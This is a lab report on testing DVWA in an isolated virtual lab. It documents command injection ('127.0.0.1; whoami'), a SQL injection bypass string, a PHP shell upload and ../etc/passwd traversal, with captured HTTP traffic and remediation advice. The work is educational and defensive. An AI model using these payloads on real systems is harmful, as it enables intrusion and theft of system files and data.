# **04 – Web Vulnerability Testing (DVWA – Multiple Vulnerabilities)**

# **Target & Environment**

| Component           | Value                                                         |
| ------------------- | ------------------------------------------------------------- |
| Analyst Machine     | Ubuntu Desktop (10.0.0.10)                                    |
| Target Host         | Metasploitable2 (10.0.0.20)                                   |
| Web Applications    | DVWA (Damn Vulnerable Web App)                                |
| DVWA Security Level | Low                                                           |
| Services Targeted   | Command Execution, SQL Injection, File Upload, File Inclusion |

All testing was performed inside an isolated VirtualBox lab with no external connectivity.

---

# **1. Objective**

Conduct hands‑on testing of multiple intentionally vulnerable web components within **DVWA** and document exploitation steps, HTTP traffic, and outcomes. Confirm the following vulnerabilities:

* Command Injection
* SQL Injection
* File Upload Bypass
* Directory Traversal (Local File Inclusion)

All tests were performed strictly for controlled, educational, and ethical purposes within a closed lab.

---

# **2. Vulnerabilities Overview**

## **2.1 Command Injection**

Occurs when user input is concatenated directly into system-level commands.
In DVWA Low mode, the `ip` parameter is passed directly to:

```
ping -c 3 <input>
```

Attackers can append shell metacharacters to run arbitrary commands.

---

## **2.2 SQL Injection**

Occurs when user-controlled input is concatenated into SQL queries without sanitization.
DVWA’s “SQL Injection” module uses raw string concatenation, enabling forced authentication bypass or data exfiltration.

Example vulnerable structure:

```
SELECT first_name, last_name FROM users WHERE id = '$id';
```

---

## **2.3 File Upload Bypass**

DVWA Low security only checks file extension superficially, allowing unauthorized files (including PHP shells) to be uploaded to a public web directory.

Uploaded files are placed in:

```
/dvwa/hackable/uploads/
```

If executable, they can be used for remote code execution.

---

## **2.4 Directory Traversal / Local File Inclusion (LFI)**

DVWA “File Inclusion” allows arbitrary file paths through `?page=` without sanitization.

Attackers can traverse directories:

```
?page=../../../../../etc/passwd
```

Which forces the server to include unintended local files.

---

# **3. Exploitation Steps**

---

# **3.1 Command Injection (Command Execution Module)**

### **3.1.1 Normal Functionality Check**

Visited:

```
DVWA → Vulnerabilities → Command Execution
```

Entered:

```
127.0.0.1
```

Page returned normal ping output.

### **3.1.2 Malicious Payload Injection**

```
127.0.0.1; whoami
```

### **3.1.3 Result**

DVWA output included:

```
www-data
```

This confirms the Apache worker executed the injected OS command.

---

# **3.2 SQL Injection (SQLi Module)**

### **3.2.1 Payload Tested**

```
1' OR '1'='1 --
```

### **3.2.2 Result**

DVWA returned:

```
First name: admin
Surname: admin
```

This confirms a successful authentication bypass and SQL injection via string concatenation.

---

# **3.3 File Upload Bypass (Upload Module)**

### **3.3.1 Upload Attempt**

Uploaded:

```
shell.php
```

### **3.3.2 Server Response**

```
../../hackable/uploads/shell.php succesfully uploaded!
```

This confirms:

* File extension validation bypassed
* File stored in a public web path
* Server-side write permissions enabled

(Not executed further for safety within the lab.)

---

# **3.4 Directory Traversal / Local File Inclusion (File Inclusion Module)**

### **3.4.1 Targeted File Paths**

#### Successful Reads

```
?page=../../../../../etc/passwd
?page=../../../../../var/log/messages
?page=../../../../../var/log/dmesg
```

Output returned sensitive system files, confirming LFI.

#### Permission Failure Case

```
?page=../../../../../var/www/dvwa/config/config.inc.php
```

This produced *no file output* due to filesystem permission restrictions on this file.
The failure is expected behavior and confirms server-side file permission enforcement.

---

# **4. Captured HTTP Traffic (Representative Examples)**

Below are the two most relevant captures for evidence.

---

## **4.1 HTTP Request — Command Injection (tcpdump)**

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 10.0.0.20
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64)
Content-Type: application/x-www-form-urlencoded
Cookie: security=low; PHPSESSID=<session>

ip=127.0.0.1%3B+whoami&submit=submit
```

Key notes:

* `%3B` = semicolon
* Attack vector is the `ip` parameter

---

## **4.2 HTTP Response (Headers)**

```
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu)
X-Powered-By: PHP/5.2.4
Content-Type: text/html;charset=utf-8
```

Response body contained both:

* Legitimate ping output
* Output of `whoami`

---

# **5. Evidence of Exploitation**

| Vulnerability             | Evidence Returned                                   |
| ------------------------- | --------------------------------------------------- |
| Command Injection         | `www-data` (executed OS-level command)              |
| SQL Injection             | Retrieved `admin` record without authentication     |
| File Upload Bypass        | Server accepted and stored `shell.php`              |
| Directory Traversal / LFI | Returned contents of `/etc/passwd` and syslog files |

---

# **6. Analysis**

| Component         | Result                                                                     |
| ----------------- | -------------------------------------------------------------------------- |
| Attack Surface    | DVWA modules: Exec, SQLi, Upload, File Inclusion                           |
| Overall Risk      | Critical                                                                   |
| Impact            | Remote code execution, credential disclosure, file access, full compromise |
| Execution Context | `www-data` OS user                                                         |

Each vulnerability represents a serious failure of input handling and server security controls.

---

# **7. Impact Summary**

An attacker could:

* Obtain system user accounts (`/etc/passwd`)
* Execute arbitrary OS commands
* Upload malicious scripts
* Access server logs for reconnaissance
* Potentially escalate to full system compromise

These vulnerabilities mimic real-world cases frequently exploited in the wild.

---

# **8. Remediation Recommendations**

* Implement strict input validation and sanitization
* Use prepared SQL statements and parameterized queries
* Enforce secure file upload restrictions
* Disable direct file inclusion based on user input
* Restrict file permissions on sensitive paths
* Run services under least-privilege accounts
* Keep web applications and PHP versions updated
* Place uploads outside web-accessible directories
* Implement WAF rules to block common exploitation patterns

---

# **9. Conclusion**

This exercise successfully demonstrated exploitation of four major web vulnerabilities in DVWA under Low security:

* OS Command Injection
* SQL Injection
* File Upload Bypass
* Directory Traversal / Local File Inclusion

Full HTTP request and response behavior was captured and analyzed.
The results confirm that insecure coding practices can lead directly to remote system compromise.

---
